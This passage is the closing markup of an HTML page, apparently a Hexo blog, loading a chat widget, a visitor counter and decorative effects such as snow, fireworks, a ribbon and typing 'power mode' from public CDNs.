}</script></div><script src="//code.tidio.co/qqpjqsklrzstouh4l6ias23ukyxcbm3p.js" async></script><script src="/js/exten.js"></script><link rel="stylesheet" href="/css/exten.css"><script src="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script src="//code.tidio.co/qqpjqsklrzstouh4l6ias23ukyxcbm3p.js" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>